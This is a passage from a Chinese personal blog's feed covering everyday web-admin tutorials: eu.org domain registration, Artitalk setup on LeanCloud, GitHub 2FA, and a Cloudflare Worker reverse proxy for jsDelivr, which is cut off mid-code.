here!</code>文字并点击。在登录界面点击下方<code>Register</code>按钮进入注册页面。</p><p><img src="https://s2.loli.net/2023/12/31/cXSHO3pW4k9RtJ2.jpg" alt=""></p><p>注册界面看着填的东西很多，但实际上只有<code>Email</code>和<code>Password</code>填真的就可以了，<code>Address</code>（地址）只用填前两行就行（邮箱必须要填真的，之后验证会用到）。填写 Address 可以用网上的生成器生成，例如 <a href="https://www.meiguodizhi.com/uk-address" rel="external nofollow noreferrer">https://www.meiguodizhi.com/uk-address</a>。填写完后点击下方<code>Create</code>。</p><p>之后系统会生成一个用户名，在你前面填写的邮箱中会收到一封验证邮件（可能在垃圾邮件中）。记住<code>nic-hdl</code>（登录用户名）后点击（或复制打开）验证链接，点击页面（如果有的话）下方的<code>Validate</code>按钮以激活账户。</p><p><img src="https://s2.loli.net/2023/12/31/xpzkFMhCd6nf5NA.jpg" alt=""></p><p>回到主页面，点击左上方<code>Login</code>文字，填入用户名（<code>nic-hdl</code>后的文字）和密码（注册时设置的那个），点击下方<code>Login</code>按钮，登入控制台。</p><p>点击<code>New Domain</code>创建域名，在该页面填写相关信息。</p><table><thead><tr><th>项目</th><th>填法</th></tr></thead><tbody><tr><td>Complete domain name</td><td>你想注册的域名，连同<code>.eu.org</code>后缀填入，例如<code>example.eu.org</code></td></tr><tr><td>Organization</td><td>【其他不用修改，<code>Private (not shown in the public Whois)</code>可以打钩，不在 Whois 公开自己填写的个人信息】</td></tr><tr><td>Administrative contact</td><td>【注册用户，对照下是不是自己的用户名即可，基本不动】</td></tr><tr><td>Technical contact</td><td>【该域名管理者，不用修改】</td></tr><tr><td>Name servers</td><td>选择<code>server names</code>（第一个），在<code>Name1</code>和<code>Name2</code>（或者更多）输入你要设置解析的服务器地址（例如<code>ns.example.com</code>。想解析到阿里就填阿里给的 NS 地址，CF、腾讯等亦然）</td></tr></tbody></table><p><img src="https://s2.loli.net/2023/12/31/RTaLoD5hckCqs7j.jpg" alt=""></p><p>填完后点击下方<code>Submit</code>，随后页面出现<code>Servers and domain names check</code>等字样。若在最后一行（一般是最后一行）看<code>Done</code>表明提交申请成功，剩下要做的就是等待了（短则几小时，通常几个月，长则难说），通过与否，官方都会发邮件给你，注意查收（包括垃圾邮件）。</p><p>之后可以回到域名官网，登入后在下方查看自己申请的域名，点击域名对应的<code>▶</code>按钮，可另做设置。域名解析请根据自己使用的服务商的说明进行操作。</p><h2 id="后记">后记</h2><blockquote><p>无法在有些服务商处添加域名，显示“域名未注册”</p></blockquote><p>试着多添加几次，也可尝试不同的提供商。</p><blockquote><p>已经申请域名，但是官网没有显示</p></blockquote><p><code>eu.org</code>审核速度很慢，可能每次审核间隔时间较久，也可能是其他原因……总之需要足够的耐心，也可以试试国际邮箱，甚至挂魔法。</p><blockquote><p>在中国大陆地区访问 <a href="http://eu.org" rel="external nofollow noreferrer">eu.org</a> 域名不稳定，有时会被拦截或无法访问</p></blockquote><p>这域名申请是免费的，所以个人猜测它和 CF 的<code>.worker.dev</code>、Vercel 的<code>.vercel.app</code>、jsDelivr 的 cdn 地址等获得了相仿“待遇”——当然有也只是众多原因之一。非移动、电信运营商只需要使用 https 访问即可</p><blockquote><p>https 能访问但 http 不能访问</p></blockquote><p>这种情况可能是运营商阻断，也可能是其他一些原因。如果你有传统服务器可以配置 Nginx 反代或域前置等方案。由于本站目前并未使用那种配置，故难以完美解决问题，只能以允许 http 访问的方式进行处理。</p><p>【以下为个人方案，通用性未知，请谨慎参考】如果对于绑定域名那里只在 DNS 服务商处修改觉得放心不下，不妨在 Vercel 项目里也进行设置。操作如下：</p><ol><li>进入 Vercel 主界面并登录，找到你准备设置的项目并进入；</li><li>点击菜单栏<code>Settings</code>-&gt;<code>Domains</code>-&gt;域名卡片右侧<code>Edit</code>-&gt;下方<code>View DNS Records &amp; More for XXX →</code>，进入该域名在 Vercel 项目中的 DNS Records；</li><li>在此处进行如下设置（填写并点击<code>Add</code>添加）：</li></ol><table><thead><tr><th>Name</th><th>Type</th><th>Value</th><th>TTL</th><th>Age</th></tr></thead><tbody><tr><td>*</td><td>CNAME</td><td><a href="http://cname-china.vercel-dns.com" rel="external nofollow noreferrer">cname-china.vercel-dns.com</a>.</td><td>60</td><td>12d</td></tr><tr><td>test</td><td>A</td><td>76.223.126.88</td><td>60</td><td>12d</td></tr></tbody></table><ol start="4"><li>保持 DNS 服务商处域名有已解析到与下方 A 记录或 CNAME 记录相同的记录（例如示例中的 test）</li><li>如果域名 https 被阻断但 http 可访问，同时你正好使用了 Cloudflare 作为 DNS 服务商，可在主页面点击域名，在菜单栏找到<code>DNS</code>-&gt;<code>记录</code>，将相应域名的<code>代理状态</code>设置为<code>仅 DNS</code>（此时云朵图标为灰色），并在菜单栏中进入<code>SSL/TLS</code>-&gt;<code>边缘证书</code>，在下方找到<code>始终使用 HTTPS</code>并关闭。这样做可以让网站不使用 https 访问，临时解决该问题。</li></ol><p>对于部分需要被引入为资源的 URL，可以将 URL 开头 https 等去除，仅保留双斜杠及之后的内容（浏览器会根据实际情况选择访问协议），同时在引入页面头部添加以下标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;upgrade-insecure-requests&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>保存后即可生效</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给站点加个说说模块 - Artitalk 配置方法</title>
      <link href="/posts/1605902499/"/>
      <url>/posts/1605902499/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>给博客加个说说模块——Artitalk 配置方法</p><p>很显然，并非所有博主想记录与分享的东西都适合单独写成文章。大量琐碎短小的“文章”很容易拉低整个站给人的印象，但写一篇完整的文章，于我而言，时间精力压力比较大。而且有很多情绪与想法，并非适合写成长文。</p><p>当然，WP、Typecho 等实现这种功能实在是方便得很，但静态网站不能这么方便╥﹏╥…</p><blockquote><p><a href="https://artitalk.js.org/" rel="external nofollow noreferrer">Artitalk.js</a></p></blockquote><p>在经过对比之后，我选择使用 Artitalk.js 作为说说模块。至于其他的，后续可能会视情况而尝试或更换。</p><p>貌似不方便搞“私密说说”，但有得用就很好了、~。</p><h2 id="LeanCloud-的相关准备">LeanCloud 的相关准备</h2><blockquote><p>如果需要将 Artitalk 与 Valine 在同一个页面使用，可将 Artitalk 与 valine 存放在同一个应用中，有效避免同一个页面使用两个 Leancloud 应用所产生的冲突。【Waline 与 Valine 数据结构比较像，因此前者配置共存方法<s>应该</s>同理，至少我是这么做的】</p><p>建议使用国际版的 LeanCloud，因为相较于国内版，它不需要配置 serverurl，速度没有区别。<font color="red">2022 年 8 月 1 日起国际版域名不对中国大陆提供服务，可自行绑定域名以解决。</font>之后填写 serverURL/REST API 的地方替换为你在 LeanCloud 项目控制台中绑定的域名即可（绑定成功会刷新为你设置的域名。Cloudflare 记得关代理，即“仅 DNS”。）</p></blockquote><h3 id="创建-Class">创建 Class</h3><p>前往 <a href="https://console.leancloud.app/apps" rel="external nofollow noreferrer">LeanCloud 国际版</a>，注册账号并配置。绑定完成之后点击创建应用，选择开发版足矣，应用名称随意。</p><p>进入该应用，选择左侧<code>数据存储</code>-&gt;<code>结构化数据</code>，点击上方<code>创建 class</code>，命名为<code>shuoshuo</code>。再点击<code>创建 class</code>新建<code>atComment</code>，权限什么的暂时保持默认。</p><p><img src="https://s2.loli.net/2023/12/30/Y2SsTwm35FypUk7.jpg" alt=""></p><p><font color="red"><strong>请严格按照官方文档中的要求创建与命名，此处命名最好不要改成其他，以免与 Artitalk 中保留项冲突</strong></font></p><p><s>在你新建的应用中找到结构化数据下的用户。点击添加用户，输入想用的用户名及密码</s>（现在 LeanCloud 好像没有<code>用户</code>这一项了，创建用户需要手动设置）。在<code>结构化数据</code>-&gt;<code>_User</code>中点击上方<code>添加行</code>创建用户，用户名和密码填完后请牢记，其他暂时保持默认。</p><p>【可选】在<code>结构化数据</code>-&gt;<code>_User</code>添加列，列名称为 <code>img</code>，默认值填上你这个账号想要用的发布说说的头像<code>url</code>。这一项不进行配置，说说头像会显示为默认头像（Artitalk 的 logo）。</p><p><img src="https://s2.loli.net/2023/12/30/8PATXW7tKRwqEDn.jpg" alt=""></p><h3 id="设置权限">设置权限</h3><p>回到<code>结构化数据</code>中，在 Class 访问权限中将<code>shuoshuo</code>的<code>add_fields</code>和<code>create</code>权限设置为指定用户，输入刚才在<code>_User</code>中创建的用户名会自动匹配。为了安全起见，将<code>delete</code>和 <code>update</code>也设置为跟它们一样的权限。</p><p>最后将<code>_User</code>中的权限全部调为指定用户，或者数据创建者，为了保证不被篡改用户数据以达到强制发布说说。</p><p><img src="https://s2.loli.net/2023/12/30/3FUJAg8LhusXEQG.jpg" alt=""></p><p>在最菜单栏中找到<code>设置</code>-&gt;<code>应用凭证</code>，记下来<code>AppID</code>、<code>AppKey</code>和<code>REST API 服务器地址</code>。国际版由于域名访问问题，需在<code>设置</code>-&gt;<code>域名绑定</code>中自行设置<code>API 访问域名</code>，等待生效后复制<code>设置</code>-&gt;<code>应用凭证</code>中更新后的<code>REST API 服务器地址</code>备用。（注：在 DNS 服务商那添加解析可能需要注意下代理或仅 DNS 的问题，例如 Cloudflare 设置解析时需要将<code>代理状态</code>设置为<code>仅 DNS</code>）</p><h2 id="开始使用">开始使用</h2><h3 id="单页使用">单页使用</h3><p>单页中配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引用 artitalk --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/artitalk&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;!-- 存放说说的容器 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;artitalk_main&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">new</span> <span class="title class_">Artitalk</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">appId</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// LeanCloud appId</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">appKey</span>: <span class="string">&#x27;&#x27;</span> <span class="comment">// LeanCloud appKey</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Hexo-使用">Hexo 使用</h3><p>由于大家的 Hexo 主题五花八门，故无法在此一一提及。这里以 Butterfly 为例</p><p>在【Blogroot】目录下打开终端，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-artitalk</span><br></pre></td></tr></table></figure><p>在<code>_config.yml</code>或<code>_config.butterfly.yml</code>中添加：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Artitalk</span></span><br><span class="line"><span class="comment"># see https://artitalk.js.org/</span></span><br><span class="line"><span class="attr">artitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 是否启用</span></span><br><span class="line">  <span class="attr">appId:</span> <span class="comment"># LeanCloud AppId</span></span><br><span class="line">  <span class="attr">appKey:</span> <span class="comment"># LeanCloud appkey</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment"># 【选】Artitalk 路径，默认为 artitalk，生成的页面为 artitalk/index.html</span></span><br><span class="line">  <span class="attr">js:</span> <span class="comment"># 【选】Artitalk CDN，默认为 https://cdn.jsdelivr.net/npm/artitalk</span></span><br><span class="line">  <span class="attr">option:</span> <span class="comment"># 【选】額外配置。官方插件文档中暂无详细说明，故此项展示为推测</span></span><br><span class="line">  <span class="comment"># serverURL: # LeanCloud REST API</span></span><br><span class="line">  <span class="comment"># lang: #语言</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment"># Artitalk 页面的 front_matter 设置</span></span><br></pre></td></tr></table></figure><p>若添加至导航，可编辑<code>_config.butterfly.yml</code>中：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Menu 目錄</span><br><span class="line">menu:</span><br><span class="line">  主页：/ || fas fa-home</span><br><span class="line">  归档：/archives/ || fas fa-archive</span><br><span class="line">  标签：/tags/ || fas fa-tags</span><br><span class="line">  分类：/categories/ || fas fa-folder-open</span><br><span class="line">  清单||fas fa-list:</span><br><span class="line">    Music: /music/ || fas fa-music</span><br><span class="line">    Movie: /movies/ || fas fa-video</span><br><span class="line"><span class="addition">+  说说：/artitalk/ || fas fa-pen # 示例</span></span><br></pre></td></tr></table></figure><p>Hexo 三连刷新生效。</p><h2 id="使用">使用</h2><p>进入 Artitalk 所在页面，在右下方点击登录，之后可以发表说说。点击已发布说说右侧的叉号可以删除。</p><p>注：如果忘记密码了，可以<font color="red"><strong>尝试</strong></font>在 LeanCloud 应用中进入<code>结构化数据</code>-&gt;<code>_User</code>中找到前面创建的那个用户所在行，找到<code>password</code>一项，选中并点击<code>编辑单元格</code>，输入新密码后点击框外，等待刷新，以重置密码。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github 双因素身份验证 2FA</title>
      <link href="/posts/863373566/"/>
      <url>/posts/863373566/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>**注意：**从 2023 年 3 月开始到 2023 年底，GitHub 将逐渐开始要求在 <a href="http://GitHub.com" rel="external nofollow noreferrer">GitHub.com</a> 上贡献代码的所有用户启用一种或多种形式的双因素身份验证 (2FA)。 如果你在符合条件的组中，当选择该组进行注册时，将收到一封通知电子邮件，该电子邮件标志着 45 天的 2FA 注册期的开始，并且你会看到要求你在 <a href="http://GitHub.com" rel="external nofollow noreferrer">GitHub.com</a> 上注册 2FA 的横幅。 如果未收到通知，则表示你不是需要启用 2FA 的组的成员，但我们强烈建议启用 2FA。</p></blockquote><blockquote><p>有关 2FA 注册推出的详细信息，请参阅此 <a href="https://github.blog/2023-03-09-raising-the-bar-for-software-security-github-2fa-begins-march-13" rel="external nofollow noreferrer">博客文章</a>。</p></blockquote><blockquote><p>Because of your contributions on GitHub, two-factor authentication will be required for your account starting Sep 28, 2023. Thank you for helping keep the ecosystem safe! Learn more about our two-factor authentication initiative.</p></blockquote><h2 id="背景">背景</h2><p>最近打开邮箱，收到了 GitHub 发来的邮件，说我的 GitHub 账户可以开启 2FA。</p><p>实际上我不太想启用它，这号我常登陆设备就那么几个，多加一步登录验证，我嫌麻烦。去搜索引擎一看，现在 GitHub 强制要求用户开启两步验证，到 2023 年底，所有用户都必须要启用双因素身份验证 (2FA)，不能只用密码。若不进行设置，则规定的时间到后不能提交代码。</p><p>打开 GitHub 的设置，输入密码后确认，发现推荐的 2FA 方法要求下载 1Password、Authy、Microsoft Authenticator 等 APP。另一种方法是使用短信验证码，但却发现它不支持中国大陆手机号（截至此文之前，它甚至连中国香港的短信都不支持）……</p><p>既如此，那较易于使用的方式便是 TOTP 应用和浏览器插件了。设置完后，在新的设备登录后需要通过动态验证码二次验证，大致类似于 Google 身份验证器那样。</p><h2 id="TOTP-应用">TOTP 应用</h2><p><s>既然 GitHub 被微软收购了，那么</s>此处以微软的<code>Authenticator</code>举例；其他 TOTP 应用也可以。</p><p>进入 <a href="https://github.com/settings/security" rel="external nofollow noreferrer">https://github.com/settings/security</a>，下拉到<code>Two-factor authentication</code>，找到并选择<code>Authenticator app</code>。</p><p>点击 Edit，会看到<code>Scan the QR code</code>。打开 Authenticator 应用，从右上角的&quot;+号&quot;, 选择其他帐户，然后扫描这个 QR 码。之后添加成功，下次新设备登录时打开该软件，进入 GitHub 一条即展示动态验证码。</p><h2 id="浏览器插件">浏览器插件</h2><p>对于安装软件这种方法，我留作备用。这里使用浏览器插件“Authenticator: 2FA Client”来完成。</p><blockquote><p>开源地址：<a href="https://github.com/Authenticator-Extension/Authenticator" rel="external nofollow noreferrer">https://github.com/Authenticator-Extension/Authenticator</a></p></blockquote><blockquote><p>Edge 扩展：<a href="https://microsoftedge.microsoft.com/addons/detail/authenticator-2fa-client/ocglkepbibnalbgmbachknglpdipeoio" rel="external nofollow noreferrer">Authenticator: 2FA Client</a></p></blockquote><blockquote><p>Chrome 扩展：<a href="https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai" rel="external nofollow noreferrer">身份验证器</a></p></blockquote><p>安装完插件后，打开 github 设置的<code>安全页面</code>，会显示一个二维码。点击扩展，选中并打开该插件，点击插件界面右上角扫描按钮，用鼠标选中 github 的二维码，即可添加 github 帐号。它会自动存储相关信息，然后就可以生成验证码了。这个验证码每 30 秒刷新一次，刷新后原来的验证码即失效。</p><blockquote><p>参考</p></blockquote><blockquote><p><a href="https://zhuanlan.zhihu.com/p/615693483" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/615693483</a></p></blockquote><blockquote><p><a href="https://zhuanlan.zhihu.com/p/657035724" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/657035724</a></p></blockquote><blockquote><p><a href="https://zhuanlan.zhihu.com/p/484991482" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/484991482</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudflare 反代 jsDelivr</title>
      <link href="/posts/912248532/"/>
      <url>/posts/912248532/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>背景：</p><p>2021 年 12 月 20 日，jsDelivr 团队主要负责人 Dmitriy Akulov 在 官方 GitHub 仓库发布说明。jsDelivr 的 ICP 被吊销，短时间内，无法也不会提供基于国内节点的托管服务。现在 jsDelivr 国内线路也是从国外绕的，这令在中国大陆地区的速度相较于此前慢了很多。</p><p>由于 jsDelivr 在加速文件方面的巨大优势，有些人开始使用它托管一些不可描述的东西，尽管它的 AUP 里写道这是不被支持的。更何况它在国内有备案，再使用它这些东西则更是危险。最终，在多种因素影响下，它在国内寄了——到现在也是时好时坏。</p><hr><h2 id="前言">前言</h2><p>由于 jsDelivr 被吊销 ICP ，如今虽恢复但仍存在不稳定的风险；然而这个平台是很不错的，例如有些引入项目，它的源更新比较全且及时。网上找了许多替代品，可要么更新不及时，要么稳定性不高……</p><p>保险方法是更换 CDN，可现在我手头已经有个域名了，何不尝试给其套上一层反向代理？</p><h2 id="准备工作">准备工作</h2><ul><li>Cloudflare 账户</li><li>域名（由于<code>.worker.dev</code>域名也受到了和 jsDelivr 类似的遭遇，故需自备域名）</li></ul><p>注：<strong>理论上</strong>该方法适用于任意网站。</p><h2 id="做法">做法</h2><p>登录到 Cloudflare 控制台，点击侧栏的<code>Workers 和 Pages</code>进入<code>概述</code>，点击<code>创建应用程序</code>蓝色按钮。进入后点击<code>创建 Workers</code>。部署&quot;Hello World&quot;脚本页面，可自行设置名称，设置完后拉到最下方找到<code>部署</code>按钮并点击。如果已经部署过，可以从图中<code>步骤 6</code>开始操作。</p><p><img src="https://s2.loli.net/2024/10/26/3b9g4MFUxOfSocV.jpg" alt=""></p><p><img src="https://s2.loli.net/2024/10/26/upWMLFSw7n9eEVR.jpg" alt=""></p><p>等待部署完成后点击<code>编辑代码</code>，将里面内容全部删除后，添加以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 替换成你想镜像的站点，该站点需有 https 支持</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&#x27;cdn.jsdelivr.net&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 除非那个站点有专门的移动适配站点，否则保持和上面一致</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = <span class="string">&#x27;cdn.jsdelivr.net&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 希望暂停服务的国家或地区</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [ <span class="string">&#x27;KP&#x27;</span>, <span class="string">&#x27;SY&#x27;</span>, <span class="string">&#x27;PK&#x27;</span>, <span class="string">&#x27;CU&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 希望阻止使用该服务的 IP 地址</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;$upstream&#x27;</span>: <span class="string">&#x27;$custom_domain&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;//cdn.jsdelivr.net&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//以下内容无需更改</span></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-ipcountry&#x27;</span>).<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-connecting-ip&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;user-agent&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">let</span> url_host = url.<span class="property">host</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">protocol</span> == <span class="string">&#x27;http:&#x27;</span>) &#123;</span><br><span class="line">        url.<span class="property">protocol</span> = <span class="string">&#x27;https:&#x27;</span></span><br><span class="line">        response = <span class="title class_">Response</span>.<span class="title function_">redirect</span>(url.<span class="property">href</span>);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">        upstream_domain = upstream</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        upstream_domain = upstream_mobile</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    url.<span class="property">host</span> = upstream_domain;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(blocked_ip_address.<span class="title function_">includes</span>(ip_address))&#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">        <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"> </span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Host&#x27;</span>, upstream_domain);</span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Referer&#x27;</span>, url.<span class="property">href</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: method,</span><br><span class="line">            <span class="attr">headers</span>: new_request_headers</span><br><span class="line">        